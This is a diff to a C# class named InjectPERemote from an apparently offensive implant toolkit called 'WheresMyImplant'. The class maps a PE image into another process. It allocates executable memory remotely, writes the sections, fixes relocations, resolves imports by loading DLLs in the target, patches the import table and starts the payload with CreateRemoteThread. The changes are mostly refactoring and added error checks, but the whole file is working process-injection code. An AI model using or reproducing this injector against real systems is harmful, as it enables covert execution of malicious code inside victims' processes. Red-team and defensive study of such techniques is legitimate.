@@ -38,41 +38,45 @@ namespace WheresMyImplant
         private const UInt32 PAGE_EXECUTE_READWRITE = 0x40;
 
         internal PELoader peLoader;
-        internal string parameters;
+        internal String parameters;
 
-        internal InjectPERemote(UInt32 processId, PELoader peLoaderNew, string parametersNew) : base(processId)
+        internal InjectPERemote(UInt32 processId, PELoader peLoader, String parameters) : base(processId)
         {
-            peLoader = peLoaderNew;
-            parameters = parametersNew;
+            this.peLoader = peLoader;
+            this.parameters = parameters;
         }
 
-        internal void execute()
+        internal void Execute()
         {
             ////////////////////////////////////////////////////////////////////////////////
             IntPtr lpBaseAddress = VirtualAllocExChecked(new IntPtr(0), peLoader.sizeOfImage);
-            WriteOutputNeutral("Iterating through " + peLoader.imageFileHeader.NumberOfSections + " Headers");
+            if (IntPtr.Zero == lpBaseAddress)
+            {
+                return;
+            }
+            WriteOutputNeutral(String.Format("Iterating through {0} Headers", peLoader.imageFileHeader.NumberOfSections));
+
             ////////////////////////////////////////////////////////////////////////////////
             for (Int32 i = 0; i < peLoader.imageFileHeader.NumberOfSections; i++)
             {
                 IntPtr lpBaseAddressSection = new IntPtr(lpBaseAddress.ToInt64() + peLoader.imageSectionHeaders[i].VirtualAddress);
                 GCHandle pinnedArray = GCHandle.Alloc(peLoader.imageBytes, GCHandleType.Pinned);
                 IntPtr imageBytesPtr = new IntPtr((Int64)pinnedArray.AddrOfPinnedObject() + peLoader.imageSectionHeaders[i].PointerToRawData);
-                UInt32 dwSizeSection = peLoader.imageSectionHeaders[i].SizeOfRawData;
-                string sectionName = new string(peLoader.imageSectionHeaders[i].Name);
-                WriteProcessMemoryChecked(lpBaseAddressSection, imageBytesPtr, dwSizeSection, sectionName);
+                String sectionName = new String(peLoader.imageSectionHeaders[i].Name);
+                WriteProcessMemoryChecked(lpBaseAddressSection, imageBytesPtr, peLoader.imageSectionHeaders[i].SizeOfRawData, sectionName);
            }
 
             ////////////////////////////////////////////////////////////////////////////////
             IntPtr lpRelocationTable = new IntPtr(lpBaseAddress.ToInt64() + peLoader.baseRelocationTableAddress);
             Winnt._IMAGE_BASE_RELOCATION relocationEntry = PtrToStructureRemote<Winnt._IMAGE_BASE_RELOCATION>(lpRelocationTable);
             UInt32 imageSizeOfBaseRelocation = (UInt32)Marshal.SizeOf(typeof(Winnt._IMAGE_BASE_RELOCATION));
-            Int32 sizeofNextBlock = (Int32)relocationEntry.SizeOfBlock;
+            Int32 sizeOfNextBlock = (Int32)relocationEntry.SizeOfBlock;
             IntPtr offset = lpRelocationTable;
             
             ////////////////////////////////////////////////////////////////////////////////
             while (true)
             {
-                IntPtr lpNextRelocationEntry = new IntPtr(lpRelocationTable.ToInt64() + (Int64)sizeofNextBlock);
+                IntPtr lpNextRelocationEntry = new IntPtr(lpRelocationTable.ToInt64() + (Int64)sizeOfNextBlock);
                 Winnt._IMAGE_BASE_RELOCATION relocationNextEntry = PtrToStructureRemote<Winnt._IMAGE_BASE_RELOCATION>(lpNextRelocationEntry);
                 IntPtr destinationAddress = new IntPtr(lpBaseAddress.ToInt64() + (Int32)relocationEntry.VirtualAdress);
                 Int32 entries = (Int32)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2);
@@ -98,8 +102,8 @@ namespace WheresMyImplant
                             break;
                     }
                 }
-                offset = new IntPtr(lpRelocationTable.ToInt64() + (Int64)sizeofNextBlock);
-                sizeofNextBlock += (Int32)relocationNextEntry.SizeOfBlock;
+                offset = new IntPtr(lpRelocationTable.ToInt64() + (Int64)sizeOfNextBlock);
+                sizeOfNextBlock += (Int32)relocationNextEntry.SizeOfBlock;
                 relocationEntry = relocationNextEntry;
                 //"The last entry is set to zero (NULL) to indicate the end of the table." - cool
                 if (0 == relocationNextEntry.SizeOfBlock)
@@ -134,10 +138,11 @@ namespace WheresMyImplant
                 IntPtr lpLocalModuleAddress = kernel32.LoadLibrary(dllName);
                 IntPtr lpModuleBaseAddress = LoadLibraryRemote(dllName);
                 WaitForSingleObjectExRemote(lpModuleBaseAddress);
-                WriteOutputGood("Loaded " + dllName);
+                WriteOutputGood(String.Format("Loaded {0}", dllName));
 				
 				////////////////////////////////////////////////////////////////////////////////
                 IntPtr lpRvaImportAddressTable = new IntPtr(lpBaseAddress.ToInt64() + imageImportDirectory.RvaImportAddressTable);
+
                 
                 while (true)
                 {
@@ -147,25 +152,31 @@ namespace WheresMyImplant
                         break;
                     }
 
-                    IntPtr lpDllFunctionName = (new IntPtr(lpBaseAddress.ToInt64() + dwRvaImportAddressTable + 2));
+                    IntPtr lpDllFunctionName = new IntPtr(lpBaseAddress.ToInt64() + dwRvaImportAddressTable + 2);
+
                     String dllFunctionName = PtrToStringAnsiRemote(lpDllFunctionName).Replace("\0", "");
                     IntPtr hModule = kernel32.GetModuleHandle(dllName);
                     IntPtr lpLocalFunctionAddress = kernel32.GetProcAddress(hModule, dllFunctionName);
                     IntPtr lpRelativeFunctionAddress = new IntPtr(lpLocalFunctionAddress.ToInt64() - lpLocalBaseAddress.ToInt64());
                     IntPtr lpFunctionAddress = new IntPtr(lpRemoteBaseAddress.ToInt64() + lpRelativeFunctionAddress.ToInt64());
+                    //WriteOutputGood(String.Format("\tLoaded Function {0}", dllFunctionName));
                     WriteOutputGood("\tLoaded Function " + dllFunctionName);
-                    //baseRemote.WriteProcessMemoryUnChecked(lpRvaImportAddressTable, lpFunctionAddress, sizeof(Int64),"");
+                    //WriteProcessMemoryChecked(lpRvaImportAddressTable, lpFunctionAddress, sizeof(Int64),"");
 
-                    WriteInt64Remote(lpRvaImportAddressTable, (Int64)lpFunctionAddress);
+                    if (!WriteInt64Remote(lpRvaImportAddressTable, (Int64)lpFunctionAddress))
+                    {
+                        WriteOutputBad("RvaImportAddressTable Write Failed");
+                        return;
+                    }
                     lpRvaImportAddressTable = new IntPtr(lpRvaImportAddressTable.ToInt64() + sizeof(Int64));
                 }
             }
 
             ////////////////////////////////////////////////////////////////////////////////
-            Int64 dwStartAddress = lpBaseAddress.ToInt64() + peLoader.addressOfEntryPoint;
-            IntPtr lpStartAddress = new IntPtr(dwStartAddress);
+            IntPtr lpStartAddress = new IntPtr(lpBaseAddress.ToInt64() + peLoader.addressOfEntryPoint);
             IntPtr lpParameter = IntPtr.Zero;
-            CreateRemoteThreadChecked(lpStartAddress, lpParameter);
+            IntPtr hThread = IntPtr.Zero;
+            CreateRemoteThreadChecked(lpStartAddress, lpParameter, hThread);
         }
     }
 }
